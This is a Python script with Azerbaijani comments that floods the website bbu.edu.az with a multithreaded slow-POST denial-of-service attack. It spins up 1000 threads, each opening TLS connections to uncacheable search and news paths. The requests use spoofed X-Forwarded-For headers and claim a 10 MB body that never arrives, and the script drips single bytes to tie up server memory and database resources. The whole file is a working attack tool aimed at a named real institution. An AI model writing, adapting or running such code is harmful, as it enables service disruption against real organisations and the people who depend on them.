import socket
import ssl
import threading
import random
import string
import time
import os

# --- TARGET CONFIG ---
TARGET_HOST = "bbu.edu.az"
TARGET_PORT = 443
THREADS = 1000 # Railway Paid üçün maksimal şəbəkə sıxlığı

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def neural_strike():
    # SSL Handshake motorunu rəsmi dövlət brauzerləri kimi (JA3) təqlid edirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrələməni serverin daxili prosessorunu ən çox yoran üsulda saxlayırıq
    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')

    while True:
        try:
            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(6)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # BBU.EDU.AZ üçün xüsusi daxili yolları hədəf alırıq
            # Bu yollar bazadan (DB) məlumat çəkdiyi üçün keşlənə bilmir
            paths = ["/search", "/az/search", "/en/search", "/news"]
            
            for _ in range(150):
                path = random.choice(paths) + f"?q={r_str(40)}&id={random.randint(1,99999)}&v={time.time()}"
                ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Sənin dediyin o 'böyük nəsə' göndərmə hiləsi:
                # Content-Length-i 10 MB göstəririk. Server həmin datanı GÖZLƏYƏCƏK.
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(4,6)}.0.0.0\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"Accept: application/json, text/plain, */*\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 10485760\r\n" # 10 Megabyte yalançı yük
                    f"Connection: keep-alive\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün hər saniyə 1 bayt atırıq
                conn.send(os.urandom(1)) 
            
            # Bağlantını bağlamırıq, serverin resursunu timeout-a qədər kilitləyirik
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"💀 NEURAL OVERLOAD ACTIVATED: {TARGET_HOST}")
    print("[!] Saturation: Targeting Database Persistence & Origin RAM.")
    
    for i in range(THREADS):
        t = threading.Thread(target=neural_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] Layer {i} deployed into Target Buffer...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
